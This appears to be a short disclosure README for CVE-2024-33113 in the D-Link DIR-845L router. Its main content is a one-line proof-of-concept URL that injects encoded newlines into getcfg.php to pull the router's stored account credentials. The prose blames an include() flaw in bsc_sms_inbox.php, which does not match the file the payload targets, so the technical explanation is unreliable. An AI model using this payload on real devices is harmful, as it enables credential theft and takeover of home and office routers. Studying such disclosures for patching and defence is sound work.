# CVE-2024-33113
D-LINK DIR-845L is vulnerable to information disclosure via the bsc_sms_inbox.php file.

CVE-2024-33113 is a vulnerability in the D-LINK DIR-845L router that allows information disclosure through the bsc_sms_inbox.php file. The vulnerability arises from improper handling of the include() function, which can be exploited by manipulating the $file variable. This allows attackers to include arbitrary PHP scripts and potentially retrieve sensitive information such as the router's username and password.

# PoC

```
http://IP:8080/getcfg.php?a=%0A_POST_SERVICES=DEVICE.ACCOUNT%0AAUTHORIZED_GROUP=1
```

![image](https://github.com/FaLLenSKiLL1/CVE-2024-33113/assets/43922662/680cc948-116d-4a89-8b89-8521c2ca3804)
